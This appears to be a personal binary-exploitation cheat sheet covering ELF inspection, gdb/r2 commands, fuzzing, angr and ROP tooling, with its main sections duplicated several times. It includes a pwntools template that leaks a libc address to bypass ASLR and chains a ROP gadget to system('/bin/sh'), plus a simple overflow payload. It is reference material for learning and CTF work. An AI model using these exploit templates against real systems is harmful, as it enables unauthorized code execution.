x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

---
# 64 Bit

## Vulnerable

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```
## Secured

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

---
# macOS Specific Tools (Mach-O binaries)

Your template title mentions "Mac", but the tools are for Linux ELF files. For macOS, you need a different set of tools for the Mach-O binary format.

#### otool
```bash
# The macOS equivalent of ldd and readelf/objdump.
otool -L binary_name # ; list dynamic libraries (like ldd)
otool -tV binary_name # ; disassemble the text section
otool -h binary_name # ; show the header
```

#### lldb
```bash
# The default debugger on macOS.
lldb binary_name
# (lldb) breakpoint set --name main
# (lldb) run
# (lldb) register read
# (lldb) memory read --size 8 --format x 0x12345678
```

#### install_name_tool
```bash
# Used to change dynamic library paths embedded in a binary.
install_name_tool -change /old/path/lib.dylib /new/path/lib.dylib binary_name
```